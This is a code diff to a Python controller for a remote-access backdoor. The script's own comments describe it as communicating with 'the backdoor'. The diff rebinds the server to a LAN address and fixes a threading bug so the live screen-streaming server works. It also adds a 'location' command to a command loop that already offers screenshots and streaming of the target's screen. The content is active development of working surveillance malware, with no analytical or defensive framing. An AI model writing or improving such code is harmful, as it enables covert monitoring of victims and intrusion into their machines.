@@ -13,7 +13,7 @@ import threading
 import sys
 
 # Connection data
-HOST = '127.0.0.1'
+HOST = '192.168.1.110'
 PORT = 5555
 STREAM_PORT = 9999
 streamFlag = 0
@@ -83,7 +83,7 @@ def streamServerStart():
     try:
         server = StreamingServer(HOST, STREAM_PORT)
 
-        t = threading.Thread(target=server.start_server())
+        t = threading.Thread(target=server.start_server)
         t.start()
 
         cmd = input("[-] Type 'stream-stop' to end the stream:")
@@ -96,6 +96,7 @@ def streamServerStart():
     
     except:
         pass
+
 
 # Sends and receives data to and from the backdoor
 def targetComs(target, ip):
@@ -129,6 +130,9 @@ def targetComs(target, ip):
         elif prompt.startswith('screenshot'):
             screenshotRecv(target, count)
             count += 1
+
+        elif prompt.startswith('location'):
+            getTargetLocation();
 
         elif prompt.startswith('stream-start'):
             streamServerStart()
